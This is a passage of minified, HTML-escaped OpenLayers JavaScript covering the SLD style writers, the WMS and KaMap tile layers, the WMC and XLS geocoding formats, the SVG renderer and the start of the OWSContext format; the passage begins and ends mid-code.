b=this.createElementNSPlus("sld:PointPlacement");null==a.labelAnchorPointX&amp;&amp;null==a.labelAnchorPointY&amp;&amp;null==a.labelAlign||this.writeNode("AnchorPoint",a,b);null==a.labelXOffset&amp;&amp;null==a.labelYOffset||this.writeNode("Displacement",a,b);null!=a.labelRotation&amp;&amp;this.writeNode("Rotation",a.labelRotation,b);return b},AnchorPoint:function(a){var b=this.createElementNSPlus("sld:AnchorPoint"),c=a.labelAnchorPointX,d=a.labelAnchorPointY;null!=c&amp;&amp;this.writeNode("AnchorPointX", c,b);null!=d&amp;&amp;this.writeNode("AnchorPointY",d,b);if(null==c&amp;&amp;null==d){var e=a.labelAlign.substr(0,1);a=a.labelAlign.substr(1,1);"l"===e?c=0:"c"===e?c=0.5:"r"===e&amp;&amp;(c=1);"b"===a?d=0:"m"===a?d=0.5:"t"===a&amp;&amp;(d=1);this.writeNode("AnchorPointX",c,b);this.writeNode("AnchorPointY",d,b)}return b},AnchorPointX:function(a){return this.createElementNSPlus("sld:AnchorPointX",{value:a})},AnchorPointY:function(a){return this.createElementNSPlus("sld:AnchorPointY",{value:a})},Displacement:function(a){var b=this.createElementNSPlus("sld:Displacement"); null!=a.labelXOffset&amp;&amp;this.writeNode("DisplacementX",a.labelXOffset,b);null!=a.labelYOffset&amp;&amp;this.writeNode("DisplacementY",a.labelYOffset,b);return b},DisplacementX:function(a){return this.createElementNSPlus("sld:DisplacementX",{value:a})},DisplacementY:function(a){return this.createElementNSPlus("sld:DisplacementY",{value:a})},Font:function(a){var b=this.createElementNSPlus("sld:Font");a.fontFamily&amp;&amp;this.writeNode("CssParameter",{symbolizer:a,key:"fontFamily"},b);a.fontSize&amp;&amp;this.writeNode("CssParameter", {symbolizer:a,key:"fontSize"},b);a.fontWeight&amp;&amp;this.writeNode("CssParameter",{symbolizer:a,key:"fontWeight"},b);a.fontStyle&amp;&amp;this.writeNode("CssParameter",{symbolizer:a,key:"fontStyle"},b);return b},Label:function(a){return this.writers.sld._OGCExpression.call(this,"sld:Label",a)},Halo:function(a){var b=this.createElementNSPlus("sld:Halo");a.haloRadius&amp;&amp;this.writeNode("Radius",a.haloRadius,b);(a.haloColor||a.haloOpacity)&amp;&amp;this.writeNode("Fill",{fillColor:a.haloColor,fillOpacity:a.haloOpacity},b); return b},Radius:function(a){return this.createElementNSPlus("sld:Radius",{value:a})},RasterSymbolizer:function(a){var b=this.createElementNSPlus("sld:RasterSymbolizer");a.geometry&amp;&amp;this.writeNode("Geometry",a.geometry,b);a.opacity&amp;&amp;this.writeNode("Opacity",a.opacity,b);a.colorMap&amp;&amp;this.writeNode("ColorMap",a.colorMap,b);return b},Geometry:function(a){var b=this.createElementNSPlus("sld:Geometry");a.property&amp;&amp;this.writeNode("ogc:PropertyName",a,b);return b},ColorMap:function(a){for(var b=this.createElementNSPlus("sld:ColorMap"), c=0,d=a.length;c&lt;d;++c)this.writeNode("ColorMapEntry",a[c],b);return b},ColorMapEntry:function(a){var b=this.createElementNSPlus("sld:ColorMapEntry");b.setAttribute("color",a.color);void 0!==a.opacity&amp;&amp;b.setAttribute("opacity",parseFloat(a.opacity));void 0!==a.quantity&amp;&amp;b.setAttribute("quantity",parseFloat(a.quantity));void 0!==a.label&amp;&amp;b.setAttribute("label",a.label);return b},PolygonSymbolizer:function(a){var b=this.createElementNSPlus("sld:PolygonSymbolizer");!1!==a.fill&amp;&amp;this.writeNode("Fill", a,b);!1!==a.stroke&amp;&amp;this.writeNode("Stroke",a,b);return b},Fill:function(a){var b=this.createElementNSPlus("sld:Fill");a.fillColor&amp;&amp;this.writeNode("CssParameter",{symbolizer:a,key:"fillColor"},b);null!=a.fillOpacity&amp;&amp;this.writeNode("CssParameter",{symbolizer:a,key:"fillOpacity"},b);return b},PointSymbolizer:function(a){var b=this.createElementNSPlus("sld:PointSymbolizer");this.writeNode("Graphic",a,b);return b},Graphic:function(a){var b=this.createElementNSPlus("sld:Graphic");void 0!=a.externalGraphic? this.writeNode("ExternalGraphic",a,b):this.writeNode("Mark",a,b);void 0!=a.graphicOpacity&amp;&amp;this.writeNode("Opacity",a.graphicOpacity,b);void 0!=a.pointRadius?this.writeNode("Size",2*a.pointRadius,b):void 0!=a.graphicWidth&amp;&amp;this.writeNode("Size",a.graphicWidth,b);void 0!=a.rotation&amp;&amp;this.writeNode("Rotation",a.rotation,b);return b},ExternalGraphic:function(a){var b=this.createElementNSPlus("sld:ExternalGraphic");this.writeNode("OnlineResource",a.externalGraphic,b);a=a.graphicFormat||this.getGraphicFormat(a.externalGraphic); this.writeNode("Format",a,b);return b},Mark:function(a){var b=this.createElementNSPlus("sld:Mark");a.graphicName&amp;&amp;this.writeNode("WellKnownName",a.graphicName,b);!1!==a.fill&amp;&amp;this.writeNode("Fill",a,b);!1!==a.stroke&amp;&amp;this.writeNode("Stroke",a,b);return b},WellKnownName:function(a){return this.createElementNSPlus("sld:WellKnownName",{value:a})},Opacity:function(a){return this.createElementNSPlus("sld:Opacity",{value:a})},Size:function(a){return this.writers.sld._OGCExpression.call(this,"sld:Size", a)},Rotation:function(a){return this.createElementNSPlus("sld:Rotation",{value:a})},OnlineResource:function(a){return this.createElementNSPlus("sld:OnlineResource",{attributes:{"xlink:type":"simple","xlink:href":a}})},Format:function(a){return this.createElementNSPlus("sld:Format",{value:a})}}},OpenLayers.Format.Filter.v1_0_0.prototype.writers),CLASS_NAME:"OpenLayers.Format.SLD.v1"});OpenLayers.Layer.WMS=OpenLayers.Class(OpenLayers.Layer.Grid,{DEFAULT_PARAMS:{service:"WMS",version:"1.1.1",request:"GetMap",styles:"",format:"image/jpeg"},isBaseLayer:!0,encodeBBOX:!1,noMagic:!1,yx:{},initialize:function(a,b,c,d){var e=[];c=OpenLayers.Util.upperCaseObject(c);1.3&lt;=parseFloat(c.VERSION)&amp;&amp;!c.EXCEPTIONS&amp;&amp;(c.EXCEPTIONS="INIMAGE");e.push(a,b,c,d);OpenLayers.Layer.Grid.prototype.initialize.apply(this,e);OpenLayers.Util.applyDefaults(this.params,OpenLayers.Util.upperCaseObject(this.DEFAULT_PARAMS)); !this.noMagic&amp;&amp;(this.params.TRANSPARENT&amp;&amp;"true"==this.params.TRANSPARENT.toString().toLowerCase())&amp;&amp;(null!=d&amp;&amp;d.isBaseLayer||(this.isBaseLayer=!1),"image/jpeg"==this.params.FORMAT&amp;&amp;(this.params.FORMAT=OpenLayers.Util.alphaHack()?"image/gif":"image/png"))},clone:function(a){null==a&amp;&amp;(a=new OpenLayers.Layer.WMS(this.name,this.url,this.params,this.getOptions()));return a=OpenLayers.Layer.Grid.prototype.clone.apply(this,[a])},reverseAxisOrder:function(){var a=this.projection.getCode();return 1.3&lt;=parseFloat(this.params.VERSION)&amp;&amp; !!(this.yx[a]||OpenLayers.Projection.defaults[a]&amp;&amp;OpenLayers.Projection.defaults[a].yx)},getURL:function(a){a=this.adjustBounds(a);var b=this.getImageSize(),c={},d=this.reverseAxisOrder();c.BBOX=this.encodeBBOX?a.toBBOX(null,d):a.toArray(d);c.WIDTH=b.w;c.HEIGHT=b.h;return this.getFullRequestString(c)},mergeNewParams:function(a){a=[OpenLayers.Util.upperCaseObject(a)];return OpenLayers.Layer.Grid.prototype.mergeNewParams.apply(this,a)},getFullRequestString:function(a,b){var c=this.map.getProjectionObject(), c=this.projection&amp;&amp;this.projection.equals(c)?this.projection.getCode():c.getCode(),c="none"==c?null:c;1.3&lt;=parseFloat(this.params.VERSION)?this.params.CRS=c:this.params.SRS=c;"boolean"==typeof this.params.TRANSPARENT&amp;&amp;(a.TRANSPARENT=this.params.TRANSPARENT?"TRUE":"FALSE");return OpenLayers.Layer.Grid.prototype.getFullRequestString.apply(this,arguments)},CLASS_NAME:"OpenLayers.Layer.WMS"});OpenLayers.Layer.KaMap=OpenLayers.Class(OpenLayers.Layer.Grid,{isBaseLayer:!0,DEFAULT_PARAMS:{i:"jpeg",map:""},initialize:function(a,b,c,d){OpenLayers.Layer.Grid.prototype.initialize.apply(this,arguments);this.params=OpenLayers.Util.applyDefaults(this.params,this.DEFAULT_PARAMS)},getURL:function(a){a=this.adjustBounds(a);var b=this.map.getResolution(),c=Math.round(1E4*this.map.getScale())/1E4,d=Math.round(a.left/b);a=-Math.round(a.top/b);return this.getFullRequestString({t:a,l:d,s:c})},calculateGridLayout:function(a, b,c){b=c*this.tileSize.w;c*=this.tileSize.h;return{tilelon:b,tilelat:c,startcol:Math.floor(a.left/b)-this.buffer,startrow:Math.floor(a.top/c)+this.buffer}},getTileBoundsForGridIndex:function(a,b){this.getTileOrigin();var c=this.gridLayout,d=c.tilelon,e=c.tilelat,f=(c.startcol+b)*d,c=(c.startrow-a)*e;return new OpenLayers.Bounds(f,c,f+d,c+e)},clone:function(a){null==a&amp;&amp;(a=new OpenLayers.Layer.KaMap(this.name,this.url,this.params,this.getOptions()));a=OpenLayers.Layer.Grid.prototype.clone.apply(this, [a]);null!=this.tileSize&amp;&amp;(a.tileSize=this.tileSize.clone());a.grid=[];return a},getTileBounds:function(a){var b=this.getResolution(),c=b*this.tileSize.w,b=b*this.tileSize.h,d=this.getLonLatFromViewPortPx(a);a=c*Math.floor(d.lon/c);d=b*Math.floor(d.lat/b);return new OpenLayers.Bounds(a,d,a+c,d+b)},CLASS_NAME:"OpenLayers.Layer.KaMap"});OpenLayers.Format.WMC.v1_1_0=OpenLayers.Class(OpenLayers.Format.WMC.v1,{VERSION:"1.1.0",schemaLocation:"http://www.opengis.net/context http://schemas.opengis.net/context/1.1.0/context.xsd",initialize:function(a){OpenLayers.Format.WMC.v1.prototype.initialize.apply(this,[a])},read_sld_MinScaleDenominator:function(a,b){var c=parseFloat(this.getChildValue(b));0&lt;c&amp;&amp;(a.maxScale=c)},read_sld_MaxScaleDenominator:function(a,b){a.minScale=parseFloat(this.getChildValue(b))},read_wmc_SRS:function(a,b){"srs"in a||(a.srs={});a.srs[this.getChildValue(b)]=!0},write_wmc_Layer:function(a){var b=OpenLayers.Format.WMC.v1.prototype.write_wmc_Layer.apply(this,[a]);if(a.maxScale){var c=this.createElementNS(this.namespaces.sld,"sld:MinScaleDenominator");c.appendChild(this.createTextNode(a.maxScale.toPrecision(16)));b.appendChild(c)}a.minScale&amp;&amp;(c=this.createElementNS(this.namespaces.sld,"sld:MaxScaleDenominator"),c.appendChild(this.createTextNode(a.minScale.toPrecision(16))),b.appendChild(c));if(a.srs)for(var d in a.srs)b.appendChild(this.createElementDefaultNS("SRS", d));b.appendChild(this.write_wmc_FormatList(a));b.appendChild(this.write_wmc_StyleList(a));a.dimensions&amp;&amp;b.appendChild(this.write_wmc_DimensionList(a));b.appendChild(this.write_wmc_LayerExtension(a));return b},CLASS_NAME:"OpenLayers.Format.WMC.v1_1_0"});OpenLayers.Format.XLS=OpenLayers.Class(OpenLayers.Format.XML.VersionedOGC,{defaultVersion:"1.1.0",stringifyOutput:!0,CLASS_NAME:"OpenLayers.Format.XLS"});OpenLayers.Format.XLS.v1=OpenLayers.Class(OpenLayers.Format.XML,{namespaces:{xls:"http://www.opengis.net/xls",gml:"http://www.opengis.net/gml",xsi:"http://www.w3.org/2001/XMLSchema-instance"},regExes:{trimSpace:/^\s*|\s*$/g,removeSpace:/\s*/g,splitSpace:/\s+/,trimComma:/\s*,\s*/g},xy:!0,defaultPrefix:"xls",schemaLocation:null,read:function(a,b){OpenLayers.Util.applyDefaults(b,this.options);var c={};this.readChildNodes(a,c);return c},readers:{xls:{XLS:function(a,b){b.version=a.getAttribute("version"); this.readChildNodes(a,b)},Response:function(a,b){this.readChildNodes(a,b)},GeocodeResponse:function(a,b){b.responseLists=[];this.readChildNodes(a,b)},GeocodeResponseList:function(a,b){var c={features:[],numberOfGeocodedAddresses:parseInt(a.getAttribute("numberOfGeocodedAddresses"))};b.responseLists.push(c);this.readChildNodes(a,c)},GeocodedAddress:function(a,b){var c=new OpenLayers.Feature.Vector;b.features.push(c);this.readChildNodes(a,c);c.geometry=c.components[0]},GeocodeMatchCode:function(a,b){b.attributes.matchCode= {accuracy:parseFloat(a.getAttribute("accuracy")),matchType:a.getAttribute("matchType")}},Address:function(a,b){var c={countryCode:a.getAttribute("countryCode"),addressee:a.getAttribute("addressee"),street:[],place:[]};b.attributes.address=c;this.readChildNodes(a,c)},freeFormAddress:function(a,b){b.freeFormAddress=this.getChildValue(a)},StreetAddress:function(a,b){this.readChildNodes(a,b)},Building:function(a,b){b.building={number:a.getAttribute("number"),subdivision:a.getAttribute("subdivision"), buildingName:a.getAttribute("buildingName")}},Street:function(a,b){b.street.push(this.getChildValue(a))},Place:function(a,b){b.place[a.getAttribute("type")]=this.getChildValue(a)},PostalCode:function(a,b){b.postalCode=this.getChildValue(a)}},gml:OpenLayers.Format.GML.v3.prototype.readers.gml},write:function(a){return this.writers.xls.XLS.apply(this,[a])},writers:{xls:{XLS:function(a){var b=this.createElementNSPlus("xls:XLS",{attributes:{version:this.VERSION,"xsi:schemaLocation":this.schemaLocation}}); this.writeNode("RequestHeader",a.header,b);this.writeNode("Request",a,b);return b},RequestHeader:function(a){return this.createElementNSPlus("xls:RequestHeader")},Request:function(a){var b=this.createElementNSPlus("xls:Request",{attributes:{methodName:"GeocodeRequest",requestID:a.requestID||"",version:this.VERSION}});this.writeNode("GeocodeRequest",a.addresses,b);return b},GeocodeRequest:function(a){for(var b=this.createElementNSPlus("xls:GeocodeRequest"),c=0,d=a.length;c&lt;d;c++)this.writeNode("Address", a[c],b);return b},Address:function(a){var b=this.createElementNSPlus("xls:Address",{attributes:{countryCode:a.countryCode}});a.freeFormAddress?this.writeNode("freeFormAddress",a.freeFormAddress,b):(a.street&amp;&amp;this.writeNode("StreetAddress",a,b),a.municipality&amp;&amp;this.writeNode("Municipality",a.municipality,b),a.countrySubdivision&amp;&amp;this.writeNode("CountrySubdivision",a.countrySubdivision,b),a.postalCode&amp;&amp;this.writeNode("PostalCode",a.postalCode,b));return b},freeFormAddress:function(a){return this.createElementNSPlus("freeFormAddress", {value:a})},StreetAddress:function(a){var b=this.createElementNSPlus("xls:StreetAddress");a.building&amp;&amp;this.writeNode(b,"Building",a.building);a=a.street;OpenLayers.Util.isArray(a)||(a=[a]);for(var c=0,d=a.length;c&lt;d;c++)this.writeNode("Street",a[c],b);return b},Building:function(a){return this.createElementNSPlus("xls:Building",{attributes:{number:a.number,subdivision:a.subdivision,buildingName:a.buildingName}})},Street:function(a){return this.createElementNSPlus("xls:Street",{value:a})},Municipality:function(a){return this.createElementNSPlus("xls:Place", {attributes:{type:"Municipality"},value:a})},CountrySubdivision:function(a){return this.createElementNSPlus("xls:Place",{attributes:{type:"CountrySubdivision"},value:a})},PostalCode:function(a){return this.createElementNSPlus("xls:PostalCode",{value:a})}}},CLASS_NAME:"OpenLayers.Format.XLS.v1"});OpenLayers.Format.XLS.v1_1_0=OpenLayers.Class(OpenLayers.Format.XLS.v1,{VERSION:"1.1",schemaLocation:"http://www.opengis.net/xls http://schemas.opengis.net/ols/1.1.0/LocationUtilityService.xsd",CLASS_NAME:"OpenLayers.Format.XLS.v1_1_0"});OpenLayers.Format.XLS.v1_1=OpenLayers.Format.XLS.v1_1_0;OpenLayers.Renderer.SVG=OpenLayers.Class(OpenLayers.Renderer.Elements,{xmlns:"http://www.w3.org/2000/svg",xlinkns:"http://www.w3.org/1999/xlink",MAX_PIXEL:15E3,translationParameters:null,symbolMetrics:null,initialize:function(a){this.supported()&amp;&amp;(OpenLayers.Renderer.Elements.prototype.initialize.apply(this,arguments),this.translationParameters={x:0,y:0},this.symbolMetrics={})},supported:function(){return document.implementation&amp;&amp;(document.implementation.hasFeature("org.w3c.svg","1.0")||document.implementation.hasFeature("http://www.w3.org/TR/SVG11/feature#SVG", "1.1")||document.implementation.hasFeature("http://www.w3.org/TR/SVG11/feature#BasicStructure","1.1"))},inValidRange:function(a,b,c){a+=c?0:this.translationParameters.x;b+=c?0:this.translationParameters.y;return a>=-this.MAX_PIXEL&amp;&amp;a&lt;=this.MAX_PIXEL&amp;&amp;b>=-this.MAX_PIXEL&amp;&amp;b&lt;=this.MAX_PIXEL},setExtent:function(a,b){var c=OpenLayers.Renderer.Elements.prototype.setExtent.apply(this,arguments),d=this.getResolution(),e=-a.left/d,d=a.top/d;if(b)return this.left=e,this.top=d,this.rendererRoot.setAttributeNS(null, "viewBox","0 0 "+this.size.w+" "+this.size.h),this.translate(this.xOffset,0),!0;(e=this.translate(e-this.left+this.xOffset,d-this.top))||this.setExtent(a,!0);return c&amp;&amp;e},translate:function(a,b){if(this.inValidRange(a,b,!0)){var c="";if(a||b)c="translate("+a+","+b+")";this.root.setAttributeNS(null,"transform",c);this.translationParameters={x:a,y:b};return!0}return!1},setSize:function(a){OpenLayers.Renderer.prototype.setSize.apply(this,arguments);this.rendererRoot.setAttributeNS(null,"width",this.size.w); this.rendererRoot.setAttributeNS(null,"height",this.size.h)},getNodeType:function(a,b){var c=null;switch(a.CLASS_NAME){case "OpenLayers.Geometry.Point":c=b.externalGraphic?"image":this.isComplexSymbol(b.graphicName)?"svg":"circle";break;case "OpenLayers.Geometry.Rectangle":c="rect";break;case "OpenLayers.Geometry.LineString":c="polyline";break;case "OpenLayers.Geometry.LinearRing":c="polygon";break;case "OpenLayers.Geometry.Polygon":case "OpenLayers.Geometry.Curve":c="path"}return c},setStyle:function(a, b,c){b=b||a._style;c=c||a._options;var d=b.title||b.graphicTitle;if(d){a.setAttributeNS(null,"title",d);var e=a.getElementsByTagName("title");0&lt;e.length?e[0].firstChild.textContent=d:(e=this.nodeFactory(null,"title"),e.textContent=d,a.appendChild(e))}var e=parseFloat(a.getAttributeNS(null,"r")),d=1,f;if("OpenLayers.Geometry.Point"==a._geometryClass&amp;&amp;e){a.style.visibility="";if(!1===b.graphic)a.style.visibility="hidden";else if(b.externalGraphic){f=this.getPosition(a);b.graphicWidth&amp;&amp;b.graphicHeight&amp;&amp; a.setAttributeNS(null,"preserveAspectRatio","none");var e=b.graphicWidth||b.graphicHeight,g=b.graphicHeight||b.graphicWidth,e=e?e:2*b.pointRadius,g=g?g:2*b.pointRadius,h=void 0!=b.graphicYOffset?b.graphicYOffset:-(0.5*g),k=b.graphicOpacity||b.fillOpacity;a.setAttributeNS(null,"x",(f.x+(void 0!=b.graphicXOffset?b.graphicXOffset:-(0.5*e))).toFixed());a.setAttributeNS(null,"y",(f.y+h).toFixed());a.setAttributeNS(null,"width",e);a.setAttributeNS(null,"height",g);a.setAttributeNS(this.xlinkns,"xlink:href", b.externalGraphic);a.setAttributeNS(null,"style","opacity: "+k);a.onclick=OpenLayers.Event.preventDefault}else if(this.isComplexSymbol(b.graphicName)){var e=3*b.pointRadius,g=2*e,l=this.importSymbol(b.graphicName);f=this.getPosition(a);d=3*this.symbolMetrics[l.id][0]/g;h=a.parentNode;k=a.nextSibling;h&amp;&amp;h.removeChild(a);a.firstChild&amp;&amp;a.removeChild(a.firstChild);a.appendChild(l.firstChild.cloneNode(!0));a.setAttributeNS(null,"viewBox",l.getAttributeNS(null,"viewBox"));a.setAttributeNS(null,"width", g);a.setAttributeNS(null,"height",g);a.setAttributeNS(null,"x",f.x-e);a.setAttributeNS(null,"y",f.y-e);k?h.insertBefore(a,k):h&amp;&amp;h.appendChild(a)}else a.setAttributeNS(null,"r",b.pointRadius);e=b.rotation;void 0===e&amp;&amp;void 0===a._rotation||!f||(a._rotation=e,e|=0,"svg"!==a.nodeName?a.setAttributeNS(null,"transform","rotate("+e+" "+f.x+" "+f.y+")"):(f=this.symbolMetrics[l.id],a.firstChild.setAttributeNS(null,"transform","rotate("+e+" "+f[1]+" "+f[2]+")")))}c.isFilled?(a.setAttributeNS(null,"fill",b.fillColor), a.setAttributeNS(null,"fill-opacity",b.fillOpacity)):a.setAttributeNS(null,"fill","none");c.isStroked?(a.setAttributeNS(null,"stroke",b.strokeColor),a.setAttributeNS(null,"stroke-opacity",b.strokeOpacity),a.setAttributeNS(null,"stroke-width",b.strokeWidth*d),a.setAttributeNS(null,"stroke-linecap",b.strokeLinecap||"round"),a.setAttributeNS(null,"stroke-linejoin","round"),b.strokeDashstyle&amp;&amp;a.setAttributeNS(null,"stroke-dasharray",this.dashStyle(b,d))):a.setAttributeNS(null,"stroke","none");b.pointerEvents&amp;&amp; a.setAttributeNS(null,"pointer-events",b.pointerEvents);null!=b.cursor&amp;&amp;a.setAttributeNS(null,"cursor",b.cursor);return a},dashStyle:function(a,b){var c=a.strokeWidth*b,d=a.strokeDashstyle;switch(d){case "solid":return"none";case "dot":return[1,4*c].join();case "dash":return[4*c,4*c].join();case "dashdot":return[4*c,4*c,1,4*c].join();case "longdash":return[8*c,4*c].join();case "longdashdot":return[8*c,4*c,1,4*c].join();default:return OpenLayers.String.trim(d).replace(/\s+/g,",")}},createNode:function(a, b){var c=document.createElementNS(this.xmlns,a);b&amp;&amp;c.setAttributeNS(null,"id",b);return c},nodeTypeCompare:function(a,b){return b==a.nodeName},createRenderRoot:function(){var a=this.nodeFactory(this.container.id+"_svgRoot","svg");a.style.display="block";return a},createRoot:function(a){return this.nodeFactory(this.container.id+a,"g")},createDefs:function(){var a=this.nodeFactory(this.container.id+"_defs","defs");this.rendererRoot.appendChild(a);return a},drawPoint:function(a,b){return this.drawCircle(a, b,1)},drawCircle:function(a,b,c){var d=this.getResolution(),e=(b.x-this.featureDx)/d+this.left;b=this.top-b.y/d;return this.inValidRange(e,b)?(a.setAttributeNS(null,"cx",e),a.setAttributeNS(null,"cy",b),a.setAttributeNS(null,"r",c),a):!1},drawLineString:function(a,b){var c=this.getComponentsString(b.components);return c.path?(a.setAttributeNS(null,"points",c.path),c.complete?a:null):!1},drawLinearRing:function(a,b){var c=this.getComponentsString(b.components);return c.path?(a.setAttributeNS(null, "points",c.path),c.complete?a:null):!1},drawPolygon:function(a,b){for(var c="",d=!0,e=!0,f,g,h=0,k=b.components.length;h&lt;k;h++)c+=" M",f=this.getComponentsString(b.components[h].components," "),(g=f.path)?(c+=" "+g,e=f.complete&amp;&amp;e):d=!1;return d?(a.setAttributeNS(null,"d",c+" z"),a.setAttributeNS(null,"fill-rule","evenodd"),e?a:null):!1},drawRectangle:function(a,b){var c=this.getResolution(),d=(b.x-this.featureDx)/c+this.left,e=this.top-b.y/c;return this.inValidRange(d,e)?(a.setAttributeNS(null,"x", d),a.setAttributeNS(null,"y",e),a.setAttributeNS(null,"width",b.width/c),a.setAttributeNS(null,"height",b.height/c),a):!1},drawText:function(a,b,c){var d=!!b.labelOutlineWidth;if(d){var e=OpenLayers.Util.extend({},b);e.fontColor=e.labelOutlineColor;e.fontStrokeColor=e.labelOutlineColor;e.fontStrokeWidth=b.labelOutlineWidth;b.labelOutlineOpacity&amp;&amp;(e.fontOpacity=b.labelOutlineOpacity);delete e.labelOutlineWidth;this.drawText(a,e,c)}var f=this.getResolution(),e=(c.x-this.featureDx)/f+this.left,g=c.y/ f-this.top,d=d?this.LABEL_OUTLINE_SUFFIX:this.LABEL_ID_SUFFIX,f=this.nodeFactory(a+d,"text");f.setAttributeNS(null,"x",e);f.setAttributeNS(null,"y",-g);b.fontColor&amp;&amp;f.setAttributeNS(null,"fill",b.fontColor);b.fontStrokeColor&amp;&amp;f.setAttributeNS(null,"stroke",b.fontStrokeColor);b.fontStrokeWidth&amp;&amp;f.setAttributeNS(null,"stroke-width",b.fontStrokeWidth);b.fontOpacity&amp;&amp;f.setAttributeNS(null,"opacity",b.fontOpacity);b.fontFamily&amp;&amp;f.setAttributeNS(null,"font-family",b.fontFamily);b.fontSize&amp;&amp;f.setAttributeNS(null, "font-size",b.fontSize);b.fontWeight&amp;&amp;f.setAttributeNS(null,"font-weight",b.fontWeight);b.fontStyle&amp;&amp;f.setAttributeNS(null,"font-style",b.fontStyle);!0===b.labelSelect?(f.setAttributeNS(null,"pointer-events","visible"),f._featureId=a):f.setAttributeNS(null,"pointer-events","none");g=b.labelAlign||OpenLayers.Renderer.defaultSymbolizer.labelAlign;f.setAttributeNS(null,"text-anchor",OpenLayers.Renderer.SVG.LABEL_ALIGN[g[0]]||"middle");!0===OpenLayers.IS_GECKO&amp;&amp;f.setAttributeNS(null,"dominant-baseline", OpenLayers.Renderer.SVG.LABEL_ALIGN[g[1]]||"central");for(var h=b.label.split("\n"),k=h.length;f.childNodes.length>k;)f.removeChild(f.lastChild);for(var l=0;l&lt;k;l++){var m=this.nodeFactory(a+d+"_tspan_"+l,"tspan");!0===b.labelSelect&amp;&amp;(m._featureId=a,m._geometry=c,m._geometryClass=c.CLASS_NAME);!1===OpenLayers.IS_GECKO&amp;&amp;m.setAttributeNS(null,"baseline-shift",OpenLayers.Renderer.SVG.LABEL_VSHIFT[g[1]]||"-35%");m.setAttribute("x",e);if(0==l){var n=OpenLayers.Renderer.SVG.LABEL_VFACTOR[g[1]];null==n&amp;&amp; (n=-0.5);m.setAttribute("dy",n*(k-1)+"em")}else m.setAttribute("dy","1em");m.textContent=""===h[l]?" ":h[l];m.parentNode||f.appendChild(m)}f.parentNode||this.textRoot.appendChild(f)},getComponentsString:function(a,b){for(var c=[],d=!0,e=a.length,f=[],g,h=0;h&lt;e;h++)g=a[h],c.push(g),(g=this.getShortString(g))?f.push(g):(0&lt;h&amp;&amp;this.getShortString(a[h-1])&amp;&amp;f.push(this.clipLine(a[h],a[h-1])),h&lt;e-1&amp;&amp;this.getShortString(a[h+1])&amp;&amp;f.push(this.clipLine(a[h],a[h+1])),d=!1);return{path:f.join(b||","),complete:d}}, clipLine:function(a,b){if(b.equals(a))return"";var c=this.getResolution(),d=this.MAX_PIXEL-this.translationParameters.x,e=this.MAX_PIXEL-this.translationParameters.y,f=(b.x-this.featureDx)/c+this.left,g=this.top-b.y/c,h=(a.x-this.featureDx)/c+this.left,c=this.top-a.y/c,k;if(h&lt;-d||h>d)k=(c-g)/(h-f),h=0>h?-d:d,c=g+(h-f)*k;if(c&lt;-e||c>e)k=(h-f)/(c-g),c=0>c?-e:e,h=f+(c-g)*k;return h+","+c},getShortString:function(a){var b=this.getResolution(),c=(a.x-this.featureDx)/b+this.left;a=this.top-a.y/b;return this.inValidRange(c, a)?c+","+a:!1},getPosition:function(a){return{x:parseFloat(a.getAttributeNS(null,"cx")),y:parseFloat(a.getAttributeNS(null,"cy"))}},importSymbol:function(a){this.defs||(this.defs=this.createDefs());var b=this.container.id+"-"+a,c=document.getElementById(b);if(null!=c)return c;var d=OpenLayers.Renderer.symbol[a];if(!d)throw Error(a+" is not a valid symbol name");a=this.nodeFactory(b,"symbol");var e=this.nodeFactory(null,"polygon");a.appendChild(e);for(var c=new OpenLayers.Bounds(Number.MAX_VALUE,Number.MAX_VALUE, 0,0),f=[],g,h,k=0;k&lt;d.length;k+=2)g=d[k],h=d[k+1],c.left=Math.min(c.left,g),c.bottom=Math.min(c.bottom,h),c.right=Math.max(c.right,g),c.top=Math.max(c.top,h),f.push(g,",",h);e.setAttributeNS(null,"points",f.join(" "));d=c.getWidth();e=c.getHeight();a.setAttributeNS(null,"viewBox",[c.left-d,c.bottom-e,3*d,3*e].join(" "));this.symbolMetrics[b]=[Math.max(d,e),c.getCenterLonLat().lon,c.getCenterLonLat().lat];this.defs.appendChild(a);return a},getFeatureIdFromEvent:function(a){var b=OpenLayers.Renderer.Elements.prototype.getFeatureIdFromEvent.apply(this, arguments);b||(b=a.target,b=b.parentNode&amp;&amp;b!=this.rendererRoot?b.parentNode._featureId:void 0);return b},CLASS_NAME:"OpenLayers.Renderer.SVG"});OpenLayers.Renderer.SVG.LABEL_ALIGN={l:"start",r:"end",b:"bottom",t:"hanging"};OpenLayers.Renderer.SVG.LABEL_VSHIFT={t:"-70%",b:"0"};OpenLayers.Renderer.SVG.LABEL_VFACTOR={t:0,b:-1};OpenLayers.Renderer.SVG.preventDefault=function(a){OpenLayers.Event.preventDefault(a)};OpenLayers.Format.SLD.v1_0_0=OpenLayers.Class(OpenLayers.Format.SLD.v1,{VERSION:"1.0.0",schemaLocation:"http://www.opengis.net/sld http://schemas.opengis.net/sld/1.0.0/StyledLayerDescriptor.xsd",CLASS_NAME:"OpenLayers.Format.SLD.v1_0_0"});OpenLayers.Format.OWSContext=OpenLayers.Class(OpenLayers.Format.Context,{defaultVersion:"0.3.1",getVersion:function(a,b){var c=OpenLayers.Format.XML.VersionedOGC.prototype.getVersion.apply(this,arguments);"0.3.0"===c&amp;&amp;(c=this.defaultVersion);return c},toContext:function(a){var b={};"OpenLayers.Map"==a.CLASS_NAME&amp;&amp;(b.bounds=a.getExtent(),b.maxExtent=a.maxExtent,b.projection=a.projection,b.size=a.getSize(),b.layers=a.layers);return b},CLASS_NAME:"OpenLayers.Format.OWSContext"});OpenLayers.Format.OWSContext.v0_3_1=OpenLayers.Class(OpenLayers.Format.XML,{namespaces:{owc:"http://www.opengis.net/ows-context",gml:"http://www.opengis.net/gml",kml:"http://www.opengis.net/kml/2.2",ogc:"http://www.opengis.net/ogc",ows:"http://www.opengis.net/ows",sld:"http://www.opengis.net/sld",xlink:"http://www.w3.org/1999/xlink",xsi:"http://www.w3.org/2001/XMLSchema-instance"},VERSION:"0.3.1",schemaLocation:"http://www.opengis.net/ows-context http://www.ogcnetwork.net/schemas/owc/0.3.1/owsContext.xsd", defaultPrefix:"owc",extractAttributes:!0,xy:!0,regExes:{trimSpace:/^\s*|\s*$/g,removeSpace:/\s*/g,splitSpace:/\s+/,trimComma:/\s*,\s*/g},featureNS:"http://mapserver.gis.umn.edu/mapserver",featureType:"vector",geometryName:"geometry",nestingLayerLookup:null,initialize:function(a){OpenLayers.Format.XML.prototype.initialize.apply(this,[a]);OpenLayers.Format.GML.v2.prototype.setGeometryTypes.call(this)},setNestingPath:function(a){if(a.layersContext)for(var b=0,c=a.layersContext.length;b&lt;c;b++){var d= 